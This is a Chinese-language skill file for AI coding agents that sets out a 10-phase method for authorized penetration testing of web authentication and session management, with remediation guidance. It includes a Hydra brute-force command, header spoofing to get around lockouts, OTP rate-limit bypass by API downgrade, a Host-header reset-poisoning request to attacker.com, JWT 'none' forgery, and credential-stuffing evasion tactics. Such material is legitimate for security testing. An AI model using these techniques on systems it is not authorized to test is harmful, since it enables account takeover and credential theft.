---
name: broken-authentication-testing
title: 认证与会话漏洞检测利用
description: 当对 Web 应用做认证/会话安全测试（已获书面授权）时使用；按 10 阶段方法对密码策略、用户名枚举、暴破/撞库、会话令牌与固定、超时、MFA、口令重置逐项检测并产出漏洞评估报告与修复建议；不适用于无授权测试、用真实泄露凭据登录他人账号、或第三方 SSO 越界；触发词：broken authentication、会话固定、JWT none、OTP 暴破、撞库
domain: 安全/appsec
triggers: [认证安全测试, 会话管理漏洞, 账户接管 account takeover, 暴力破解/撞库 credential stuffing, 会话固定 session fixation, JWT 令牌攻击, MFA/OTP 绕过, 口令重置漏洞, 用户名枚举, OWASP 失效的身份认证]
tags: [安全, 渗透测试, web 安全, 认证, 会话管理, owasp, jwt, mfa, 暴力破解, misc]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [Burp Suite, Hydra, curl, Python requests, 浏览器开发者工具]
requires: []
related: [idor-vulnerability-testing, burp-suite-testing, auth-implementation-patterns, api-fuzzing-bug-bounty]
combines_with: [burp-suite-testing, penetration-testing-methodology, idor-vulnerability-testing]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
## 何时使用

- **适用**：对 Web 应用做认证与会话管理安全评估，已取得**书面授权**且有测试账号；需要系统性排查密码策略、用户名枚举、暴破/撞库防护、会话令牌强度与固定、超时、MFA、口令重置等问题（对应 OWASP Top 10「失效的身份认证」）。
- **不该用**：
  - 无明确书面授权的目标；
  - 使用真实泄露的 email:password 去登录**真人账号**（仅可用受控测试账号验证防护机制）；
  - 第三方 SSO/OAuth 提供方属授权范围外；
  - 生产环境需额外谨慎，避免锁死真实用户。

## 步骤

按 10 个阶段推进，每阶段产出可写入报告的发现：

1. **认证机制分析**：识别认证类型（口令 / Token-JWT/OAuth / mTLS / 多因子），枚举端点 `/login` `/register` `/forgot-password` `/logout` `/api/auth/*` `/oauth/*`，抓取并分析登录请求。
2. **密码策略**：测最小长度、复杂度、常见弱口令、用户名即密码。记录策略缺口（长度<8、无复杂度、允许常见口令等）。
3. **凭据枚举**：对比有效/无效用户名的响应文案、状态码、时延差异；口令重置/API 错误是否泄露账号存在性。
4. **暴力破解**：用 Hydra/Burp Intruder 测账户锁定与限流；核查锁定阈值/时长、限流维度（IP vs 账号）、CAPTCHA、`X-Forwarded-For` 等头部绕过。
5. **撞库**：用 Burp Intruder **Pitchfork** 配对 email/password 列表；评估慢速、IP 轮换、UA 随机化等绕过侦测的可行性。
6. **会话令牌**：评估熵、长度（≥128 bit）、可预测性、`HttpOnly/Secure/SameSite` 标志；批量采集令牌做模式/熵分析。
7. **会话固定**：登录前后对比 SESSIONID 是否重新生成；未变即存在固定风险。
8. **会话超时**：测空闲超时、绝对超时、登出后旧 cookie 是否服务端失效。
9. **MFA / OTP**：OTP 暴破与限流、直连 URL 跳过、改响应、空 OTP、旧 OTP 复用、**API 版本降级**（如 v3 有限流则试 v2/v1）、注册与恢复流程缺陷。
10. **口令重置**：分析 token 长度/随机性/有效期/单次使用/账号绑定；试改 `user`/`email` 参数与 **Host 头注入**。

## 指令

```bash
# 阶段4：Hydra 表单暴破
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# 阶段4：限流绕过，逐次切换来源 IP 头
# X-Forwarded-For / X-Real-IP / X-Originating-IP / X-Client-IP / True-Client-IP

# 阶段9：API 版本降级绕过 OTP 限流（crAPI 示例）
POST /api/v2/check-otp
{"otp": "1234"}

# 阶段10：Host 头注入污染重置链接
POST /forgot-password HTTP/1.1
Host: attacker.com

email=victim@email.com
```

```python
#!/usr/bin/env python3
# 阶段6：批量采集会话令牌做熵/模式分析（查递增序列、时间戳成分）
import requests
tokens = []
for i in range(100):
    r = requests.get("https://target.com/login")
    tokens.append(r.cookies.get("SESSIONID"))
# 分析：是否顺序递增？熵是否足够？是否含时间戳？
```

会话固定判定：登录前 `Set-Cookie: SESSIONID=abc123`，带同一 cookie 登录后若 SESSIONID 仍为 `abc123` 即**存在漏洞**，分配新会话才安全。

## 示例

- **账户锁定绕过**：5 次错密触发「锁定 30 分钟」后，逐次递增 `X-Forwarded-For: 192.168.1.x` 继续尝试；并试 `Admin`/`ADMIN` 大小写变体（部分系统视为不同账号、绕过锁定）。
- **JWT `none` 算法攻击**：抓 `Authorization: Bearer <jwt>`，解码后将头部 `alg` 改为 `none`、payload 改 `{"user":"admin","role":"admin"}`、**去掉签名**，提交篡改 token 验证是否被接受。
- **口令重置越权**：对测试账号请求重置，拿到 `https://target.com/reset?token=...`，验证 token 是否可二次使用/过期/被改字符；再试 `...&email=admin@example.com`，看能否用本账号 token 重置管理员口令。

## 注意事项

- **合法性**：仅在书面授权范围内测试；勿用真实泄露凭据，勿访问真人账号，全程记录测试活动。
- **技术限制**：CAPTCHA 阻碍自动化；限流影响暴破节奏；MFA 显著提高难度；会话固定等需受害者交互才能利用。
- **范围**：测试账号行为可能不同于生产；部分功能在测试环境被禁用；第三方认证可能越界。
- **常见结论对照**：弱口令/无锁定/会话令牌弱/不安全重置/会话固定多为 High，MFA 绕过常为 Critical，用户名枚举/无超时多为 Medium。
- Cookie 标志缺失对照：缺 `HttpOnly`→XSS 可窃会话；缺 `Secure`→明文 HTTP 传输；缺 `SameSite`→CSRF 风险。

## 互见

- OWASP Top 10「失效的身份认证」、JWT/OAuth 令牌安全、CSRF 与 SameSite、暴力破解与限流防护、越权访问（IDOR/越权重置）相关技能。

---
采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
